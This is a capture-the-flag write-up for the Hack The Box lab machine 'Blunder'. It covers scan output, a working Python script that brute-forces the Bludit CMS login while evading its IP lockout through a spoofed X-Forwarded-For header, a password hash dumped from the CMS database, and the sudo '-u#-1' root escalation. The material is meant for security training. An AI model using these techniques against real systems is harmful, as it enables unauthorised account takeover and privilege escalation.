---
"title": "Hack The Box - Blunder"
"date": 2020-10-17
"tags": ["linux", "easy", "bludit", "mysql", ""]
"keywords": ["linux", "easy", "bludit", "mysql", ""]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "We are going to pwn Blunder from Hack The Box."
"featured_image": "/img/htb-blunder/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-blunder/Untitled.png)

We are going to pwn Blunder from Hack The Box.                                                             

Link: [https://www.hackthebox.eu/home/machines/profile/254](https://www.hackthebox.eu/home/machines/profile/254)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%), Ubiquiti AirOS 5.5.9 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

## HTTP

Its an normal webpage with some posts. Let's run Gobuster to find some interesting files.

![Untitled](/img/htb-blunder/Untitled%201.png)

## Gobuster Result

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/05/31 11:15:10 Starting gobuster
===============================================================
/0 (Status: 200)
/about (Status: 200)
/admin (Status: 301)
/cgi-bin/ (Status: 301)
/install.php (Status: 200)
/LICENSE (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/todo.txt (Status: 200)
===============================================================
2020/05/31 11:26:37 Finished
===============================================================
```

`/admin`

![Untitled](/img/htb-blunder/Untitled%202.png)

Its an BLUDIT CMS

`/todo.txt`

![Untitled](/img/htb-blunder/Untitled%203.png)

We got a valid username `fergus` and we got few info that CMS is not updated means we can find exploit for it.

I decided to bruteforce the login page. While googling I found this.

> [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

When reading that I came there is some sort of mechanism that blocks the IP if someone incorrectly login 10 times or more. This script demonstrates how he bypass it.

So I did some changes in the script. Because we need to find the password. Instead of using `rockyou` I used `cewl` to create a wordlist of the website.

![Untitled](/img/htb-blunder/Untitled%204.png)

My Wordlist is ready.

Here is the modified script.

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/'
username = 'fergus'
wordlist = []
passwd = open("pass","r").readlines()

for x in passwd:
    wordlist.append(x.strip("\n"))

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Changes I did here is, I use the wordlist I created instead of the old one.

```bash
root@kali:~/CTF/HTB/Boxes/Blunder# python3 exploit.py 
[*] Trying: the
[*] Trying: Load
[*] Trying: Plugins
[*] Trying: and
[*] Trying: for
.
.
.

[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

We got the password.RolandDeschain

I logged in with `fergus : RolandDeschain` 

![Untitled](/img/htb-blunder/Untitled%205.png)

## Getting Shell

[https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)

## Method 1:

![Untitled](/img/htb-blunder/Untitled%206.png)

![Untitled](/img/htb-blunder/Untitled%207.png)

## Method 2 (Metasploit)

There is a metasploit module too

> [https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec](https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec)

![Untitled](/img/htb-blunder/Untitled%208.png)

## Getting User Hugo

After some enumeration, I found user `hugo` hash in `/var/www/bludit-3.10.0a/bl-content/databases`

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
ls
categories.php	plugins       site.php	  tags.php
pages.php	security.php  syslog.php  users.php
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
[?php defined('BLUDIT') or die('Bludit CMS.'); ?](?php defined('BLUDIT') or die('Bludit CMS.'); ?)
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$
```

Cracked that in crackstation.

![Untitled](/img/htb-blunder/Untitled%209.png)

su to `hugo : Password120` and I got user flag.

```bash
$ su hugo
su hugo
Password: Password120

hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home
cd /home
hugo@blunder:/home$ ls
ls
hugo  shaun
hugo@blunder:/home$ cd hugo
cd hugo
hugo@blunder:~$ cat user.txt
cat user.txt
```

## Privilege Escalation

Like always I started with `sudo -l`

```bash
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

> [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

When we do `sudo` it doesn't check if the user even exists or not, so it tends to execute it with the specified argument as a user itself. Now, -u is used to define the user itself, #-1 will return 0, the default value of root itself.

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# cd /root
cd /root
root@blunder:/root# cat root.txt
cat root.txt
```